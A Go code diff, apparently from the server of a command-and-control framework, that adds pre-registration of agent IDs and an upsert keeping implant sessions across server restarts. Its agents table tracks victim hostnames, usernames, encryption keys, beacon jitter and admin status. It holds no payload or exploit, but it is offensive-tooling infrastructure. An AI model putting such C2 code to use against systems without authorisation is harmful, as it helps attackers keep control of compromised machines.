@@ -235,6 +235,18 @@ func NewDB(path string) (*DB, error) {
 	return &DB{db: db}, nil
 }
 
+// PreRegisterAgent inserts a placeholder row with the given ID before the agent connects.
+// This lets the server recognise the agent's ResumeID on first contact and resume
+// the same session even after a server restart (preset identity pattern).
+func (d *DB) PreRegisterAgent(id string) error {
+	_, err := d.db.Exec(
+		`INSERT OR IGNORE INTO agents (id, hostname, username, os, ip, pid, aes_key, sleep_sec, jitter_pct, transport, active, process_name, is_admin, language)
+		 VALUES (?, '', '', '', '', 0, '', 30, 20, 'tcp', 0, '', 0, 'go')`,
+		id,
+	)
+	return err
+}
+
 func (d *DB) RegisterAgent(a *Agent) error {
 	isAdminInt := 0
 	if a.IsAdmin {
@@ -248,11 +260,21 @@ func (d *DB) RegisterAgent(a *Agent) error {
 	if lang == "" {
 		lang = "go"
 	}
+	// Use ON CONFLICT upsert so that first_seen is never reset when the agent
+	// reconnects or the server restarts (preset identity pattern).
 	_, err := d.db.Exec(
-		`INSERT OR REPLACE INTO agents (id, hostname, username, os, ip, pid, aes_key, sleep_sec, jitter_pct, transport, active, process_name, is_admin, parent_id, language)
-		 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?, ?)`,
+		`INSERT INTO agents (id, hostname, username, os, ip, pid, aes_key, sleep_sec, jitter_pct, transport, active, process_name, is_admin, parent_id, language)
+		 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?, ?)
+		 ON CONFLICT(id) DO UPDATE SET
+		     hostname=excluded.hostname, username=excluded.username, os=excluded.os,
+		     ip=excluded.ip, pid=excluded.pid, aes_key=excluded.aes_key,
+		     sleep_sec=excluded.sleep_sec, jitter_pct=excluded.jitter_pct,
+		     transport=excluded.transport, active=1,
+		     process_name=excluded.process_name, is_admin=excluded.is_admin,
+		     parent_id=excluded.parent_id, language=excluded.language`,
 		a.ID, a.Hostname, a.Username, a.OS, a.IP, a.PID,
-		hex.EncodeToString(a.AESKey), a.SleepSec, a.JitterPct, a.Transport, a.ProcessName, isAdminInt, parentID, lang,
+		hex.EncodeToString(a.AESKey), a.SleepSec, a.JitterPct, a.Transport,
+		a.ProcessName, isAdminInt, parentID, lang,
 	)
 	return err
 }
